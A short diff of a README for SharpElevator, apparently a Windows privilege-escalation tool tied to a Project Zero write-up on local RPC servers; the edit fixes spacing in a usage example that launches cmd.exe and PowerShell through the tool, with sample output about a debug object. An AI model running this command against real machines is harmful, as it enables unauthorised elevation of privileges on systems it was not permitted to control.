@@ -101,7 +101,7 @@ https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers
                                            Defaults to false.
 
   Example:
-    ..>SharpElevator.exe /command:cmd.exe /arguments:""/ c powershell.exe"" /newconsole
+    ..>SharpElevator.exe /command:cmd.exe /arguments:""/c powershell.exe"" /newconsole
 
         [+] Unelevatad process created(C:\Windows\System32\notepad.exe)
         [+] Reference to debug object obtained
